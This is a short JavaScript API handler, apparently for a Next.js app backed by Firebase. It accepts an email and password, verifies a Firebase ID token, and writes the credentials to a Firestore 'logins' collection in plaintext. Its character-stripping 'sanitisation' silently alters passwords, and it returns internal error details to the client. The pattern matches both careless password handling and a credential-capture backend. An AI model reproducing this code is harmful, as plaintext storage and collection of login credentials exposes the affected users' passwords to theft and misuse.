const admin = require('firebase-admin');
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
    });
}

const db = admin.firestore();

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const { email, pass: password, authToken } = req.body;

            // Verify the Firebase ID token
            const decodedToken = await admin.auth().verifyIdToken(authToken);
            if (!decodedToken) {
                return res.status(401).json({ error: 'Unauthorized' });
            }

            // Sanitize input
            const sanitizedEmail = email.replace(/[^a-zA-Z0-9@.]/g, '');
            const sanitizedPassword = password.replace(/[^a-zA-Z0-9]/g, '');

            // Create a document to write to Firestore
            const logEntry = {
                email: sanitizedEmail,
                password: sanitizedPassword,
                timestamp: admin.firestore.FieldValue.serverTimestamp()
            };

            // Write the log entry to Firestore
            await db.collection('logins').add(logEntry);

            res.status(200).send('Login information saved successfully!');
        } catch (error) {
            console.error('Error saving login data:', error.message);
            res.status(500).json({ error: 'Internal Server Error', details: error.message });
        }
    } else {
        res.status(405).json({ error: 'Method Not Allowed' });
    }
}
